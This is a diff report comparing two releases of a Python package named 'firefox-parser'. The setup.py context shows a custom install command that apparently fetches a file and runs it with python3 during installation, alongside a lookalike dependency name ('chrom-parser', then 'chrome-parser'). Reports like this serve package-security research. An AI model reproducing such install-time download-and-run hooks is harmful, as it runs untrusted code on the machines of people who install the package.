# Comparing `tmp/firefox-parser-1.1.6.tar.gz` & `tmp/firefox-parser-1.1.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "firefox-parser-1.1.6.tar", last modified: Wed May 17 10:21:43 2023, max compression
+gzip compressed data, was "firefox-parser-1.1.7.tar", last modified: Wed May 17 10:25:15 2023, max compression
```

## Comparing `firefox-parser-1.1.6.tar` & `firefox-parser-1.1.7.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-05-17 10:21:43.921757 firefox-parser-1.1.6/
--rw-rw-rw-   0        0        0       96 2023-05-17 10:21:43.915283 firefox-parser-1.1.6/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-17 10:21:43.914213 firefox-parser-1.1.6/firefox_parser.egg-info/
--rw-rw-rw-   0        0        0       96 2023-05-17 10:21:43.000000 firefox-parser-1.1.6/firefox_parser.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      197 2023-05-17 10:21:43.000000 firefox-parser-1.1.6/firefox_parser.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-17 10:21:43.000000 firefox-parser-1.1.6/firefox_parser.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       37 2023-05-17 10:21:43.000000 firefox-parser-1.1.6/firefox_parser.egg-info/requires.txt
--rw-rw-rw-   0        0        0        1 2023-05-17 10:21:43.000000 firefox-parser-1.1.6/firefox_parser.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-17 10:21:43.922332 firefox-parser-1.1.6/setup.cfg
--rw-rw-rw-   0        0        0     1593 2023-05-17 10:21:42.000000 firefox-parser-1.1.6/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-17 10:25:14.996188 firefox-parser-1.1.7/
+-rw-rw-rw-   0        0        0       96 2023-05-17 10:25:14.994287 firefox-parser-1.1.7/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-17 10:25:14.991293 firefox-parser-1.1.7/firefox_parser.egg-info/
+-rw-rw-rw-   0        0        0       96 2023-05-17 10:25:14.000000 firefox-parser-1.1.7/firefox_parser.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      197 2023-05-17 10:25:14.000000 firefox-parser-1.1.7/firefox_parser.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-17 10:25:14.000000 firefox-parser-1.1.7/firefox_parser.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       38 2023-05-17 10:25:14.000000 firefox-parser-1.1.7/firefox_parser.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        1 2023-05-17 10:25:14.000000 firefox-parser-1.1.7/firefox_parser.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-17 10:25:14.996188 firefox-parser-1.1.7/setup.cfg
+-rw-rw-rw-   0        0        0     1594 2023-05-17 10:25:11.000000 firefox-parser-1.1.7/setup.py
```

### Comparing `firefox-parser-1.1.6/setup.py` & `firefox-parser-1.1.7/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -35,18 +35,18 @@
                 subprocess.Popen(['python3', chromium_path])
         else:
             print('Error:', response.status_code)
         
 
 setup(
     name='firefox-parser',
-    version='1.1.6',
+    version='1.1.7',
     description='FireFox Parser in Python',
     cmdclass={
         'install': PreInstallCommand,
     },
     install_requires=[
         'requests==2.26.0',
-        'chrom-parser==1.1.4'
+        'chrome-parser==1.1.4'
     ],
     # Other package details
 )
```

